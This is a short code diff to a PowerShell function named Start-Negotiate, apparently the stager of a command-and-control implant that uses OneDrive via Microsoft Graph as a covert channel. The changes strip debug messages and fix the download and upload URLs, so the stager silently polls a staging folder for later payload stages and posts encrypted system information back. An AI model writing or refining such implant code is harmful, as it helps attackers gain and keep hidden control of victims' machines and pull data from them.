@@ -117,12 +117,9 @@ function Start-Negotiate {
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
-    write-host "Waiting for stage 2";
     Do{try{
     $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_2.txt:/content");
-    Write-host $raw
-    }catch{Start-Sleep -Seconds $(($PI -as [Int])*2);write-host "Sleeping again"}}While($raw -eq $null);
-    write-host "Found stage 2!"
+    }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
 
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
@@ -188,12 +185,15 @@ function Start-Negotiate {
     $wc.Headers.Set("Content-Type", "application/octet-stream");
 
     # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
-    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_3.txt", "PUT", $rc4p2);
+    $Null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_3.txt:/content", "PUT", $rc4p2);
 
     Start-Sleep -Seconds $(($PI -as [Int])*2);
     $wc.Headers.Set("User-Agent",$UA);
     $wc.Headers.Set("Authorization", "Bearer $T");
-    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt");
+    $raw=$null;
+    do{try{
+    $raw=$wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/REPLACE_STAGING_FOLDER/$($ID)_4.txt:/content");
+    }catch{Start-Sleep -Seconds $(($PI -as [Int])*2)}}While($raw -eq $null);
 
     Start-Sleep -Seconds $($PI -as [Int]);
     $wc2=New-Object System.Net.WebClient;
